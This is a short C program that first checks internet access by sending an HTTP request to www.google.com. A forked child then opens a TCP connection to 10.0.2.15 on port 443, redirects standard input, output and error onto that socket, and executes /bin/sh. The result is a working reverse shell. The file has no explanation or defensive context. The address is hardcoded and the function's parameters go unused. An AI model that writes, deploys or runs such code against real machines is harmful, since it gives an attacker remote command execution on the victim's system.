#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <netdb.h>

#define MAX_LINE 256

int parser_online(void)
{
    int sockfd,val;
    char buffer[MAX_LINE];
    struct hostent *google_ent=NULL;
    struct sockaddr_in google_addr;

    sockfd = -1;

    if((google_ent = gethostbyname("www.google.com")) != NULL)
    {
        if((sockfd =    socket(google_ent->h_addrtype,SOCK_STREAM,IPPROTO_TCP)) != -1)
        {
            val = 1;
            if(setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR, (char *) &val, sizeof(val)) == 0 && setsockopt(sockfd,IPPROTO_TCP,TCP_NODELAY, (char *) &val, sizeof(val)) == 0)
            {
                google_addr.sin_family = google_ent->h_addrtype;
                memcpy(&(google_addr.sin_addr), google_ent->h_addr, google_ent->h_length);
                google_addr.sin_port = htons(80);
                if( connect(sockfd,(struct sockaddr *) &google_addr,sizeof(google_addr)) == 0)
                {
                    if(write(sockfd,"GET /index.html HTTP/1.1\r\n\r\n", 29) >= 28)
                    {
                        shutdown(sockfd, SHUT_WR);
                        if(read(sockfd, buffer, MAX_LINE) != -1) // all right!
                        {
                            close(sockfd);
                            return 1;
                        }
                        else
                            printf("read() error\n");
                    }
                    else
                        printf("write() error\n");
                }
                else
                    printf("connect() error\n");
            }
            else
                printf("setsockopt() error\n");
        }
        else
            printf("socket() error\n");
    }
    else
        printf("cannot resolve IP for mom Google. \n"); // this is is the most common error.

    if(sockfd!=-1)
        close(sockfd);
    return 0; // no internet

}

int start_reverse_shell(char *ip, unsigned int port){

    struct sockaddr_in sa;
    int s;

    int pid = fork();

    if ( pid == 0 ){
        printf("This is the child process\n");

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr("10.0.2.15");
        sa.sin_port = htons(443);

        s = socket(AF_INET, SOCK_STREAM, 0); 
        connect(s, (struct sockaddr *)&sa, sizeof(sa));
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);

        execve("/bin/sh", 0, 0);
        printf("shell started\n");
        return 0;
    }
    else {
        printf("This is the parent process\n");
        int i = 0;
        for(i = 0; i < 10; i++){
            printf("%d\n", i);
            sleep(1);
        }

        return 1;
    }
}

int main(int argc, char *argv[])
{

    printf("start\n");

    int online = parser_online();
    printf("%d\n", online);

    if(online){
        start_reverse_shell("10.0.2.15", 443);
    }

    return 0; 
}


